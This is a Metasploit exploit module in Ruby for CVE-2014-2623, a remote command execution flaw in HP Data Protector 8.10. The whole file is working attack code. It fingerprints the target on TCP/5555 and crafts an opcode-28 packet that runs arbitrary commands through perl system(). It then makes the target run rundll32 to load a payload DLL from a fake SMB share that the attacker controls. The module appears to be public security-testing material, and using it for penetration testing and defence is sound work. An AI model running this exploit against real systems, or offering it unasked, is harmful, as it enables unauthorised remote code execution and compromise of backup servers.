# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::SMB::Server::Share
  include Msf::Exploit::EXE
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;HP Data Protector 8.10 Remote Command Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a remote command execution on HP Data Protector 8.10. Arbitrary
        commands can be execute by sending crafted requests with opcode 28 to the OmniInet
        service listening on the TCP/5555 port. Since there is an strict length limitation on
        the command, rundll32.exe is executed, and the payload is provided through a DLL by a
        fake SMB server. This module has been tested successfully on HP Data Protector 8.1 on
        Windows 7 SP1.
      },
      &#039;Author&#039;         => [
        &#039;Christian Ramirez&#039;, # POC
        &#039;Henoch Barrera&#039;, # POC
        &#039;Matthew Hall <hallm[at]sec-1.com>&#039; # Metasploit Module
      ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2014-2623&#039;],
          [&#039;OSVDB&#039;, &#039;109069&#039;],
          [&#039;EDB&#039;, &#039;34066&#039;],
          [&#039;URL&#039;, &#039;https://h20564.www2.hp.com/hpsc/doc/public/display?docId=emr_na-c04373818&#039;]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;thread&#039;,
        },
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 2048,
          &#039;DisableNops&#039; => true
        },
      &#039;Privileged&#039;     => true,
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Stance&#039;         => Msf::Exploit::Stance::Aggressive,
      &#039;Targets&#039;        =>
        [
          [ &#039;HP Data Protector 8.10 / Windows&#039;, { } ],
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Nov 02 2014&#039;))
 
      register_options(
        [
          Opt::RPORT(5555),
          OptString.new(&#039;FILE_NAME&#039;, [ false, &#039;DLL File name to share&#039;]),
          OptInt.new(&#039;SMB_DELAY&#039;, [true, &#039;Time that the SMB Server will wait for the payload request&#039;, 15])
        ], self.class)
 
      deregister_options(&#039;FOLDER_NAME&#039;)
      deregister_options(&#039;FILE_CONTENTS&#039;)
  end
 
  def check
    fingerprint = get_fingerprint
 
    if fingerprint.nil?
      return Exploit::CheckCode::Unknown
    end
 
    print_status("#{peer} - HP Data Protector version #{fingerprint}")
 
    if fingerprint =~ /HP Data Protector A\.08\.(\d+)/
      minor = $1.to_i
    else
      return Exploit::CheckCode::Safe
    end
 
    if minor < 11
      return Exploit::CheckCode::Appears
    end
 
    Exploit::CheckCode::Detected
  end
 
  def peer
    "#{rhost}:#{rport}"
  end
 
  def get_fingerprint
    ommni = connect
    ommni.put(rand_text_alpha_upper(64))
    resp = ommni.get_once(-1)
    disconnect
 
    if resp.nil?
      return nil
    end
 
    Rex::Text.to_ascii(resp).chop.chomp # Delete unicode last null
  end
 
  def send_pkt(cmd)
    cmd.gsub!("\\", "\\\\\\\\")
 
    pkt = "2\x00"
    pkt << "\x01\x01\x01\x01\x01\x01\x00"
    pkt << "\x01\x00"
    pkt << "\x01\x00"
    pkt << "\x01\x00"
    pkt << "\x01\x01\x00 "
    pkt << "28\x00"
    pkt << "\\perl.exe\x00 "
    pkt << "-esystem(&#039;#{cmd}&#039;)\x00"
 
    connect
    sock.put([pkt.length].pack(&#039;N&#039;) + pkt)
    disconnect
  end
 
  def primer
    self.file_contents = generate_payload_dll
    print_status("File available on #{unc}...")
 
    print_status("#{peer} - Trying to execute remote DLL...")
    sploit = "rundll32.exe #{unc},#{rand_text_numeric(1)}"
    send_pkt(sploit)
  end
 
  def setup
    super
 
    self.file_name = datastore[&#039;FILE_NAME&#039;] || "#{Rex::Text.rand_text_alpha(4 + rand(3))}.dll"
 
    unless file_name =~ /\.dll$/
      fail_with(Failure::BadConfig, "FILE_NAME must end with .dll")
    end
  end
 
  def exploit
    begin
      Timeout.timeout(datastore[&#039;SMB_DELAY&#039;]) {super}
    rescue Timeout::Error
      # do nothing... just finish exploit and stop smb server...
    end
  end
end

